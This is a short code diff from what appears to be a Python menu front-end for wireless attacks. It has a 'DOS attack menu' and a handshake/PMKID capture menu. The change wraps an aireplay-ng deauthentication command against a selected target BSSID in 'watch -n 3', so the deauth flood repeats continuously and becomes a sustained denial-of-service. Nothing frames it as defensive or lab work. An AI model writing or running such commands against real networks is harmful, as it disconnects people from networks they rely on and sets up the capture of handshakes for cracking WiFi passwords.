@@ -68,7 +68,7 @@ def set_data():
         { 'title': "Fix network issues", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng check kill \n sudo service NetworkManager restart' },
         { 'title': "select Wifi target", 'type': WIFISEL, 'subtitle': "selected target: " + target, 'options': wifilist },
         { 'title': "DOS atack menu", 'type': MENU, 'subtitle': "DOS attak menu", 'options': [
-          {'title': "DEAUTH", 'type': COMMAND, 'command': 'sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface + 'mon' },
+          {'title': "DEAUTH", 'type': COMMAND, 'command': 'watch -n 3 sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface + 'mon' },
         ]},
         { 'title': "Handshake/PMKID tools menu", 'type': MENU, 'subtitle': "DOS attak menu", 'options': [
           {'title': "NO", 'type': EXITMENU, },
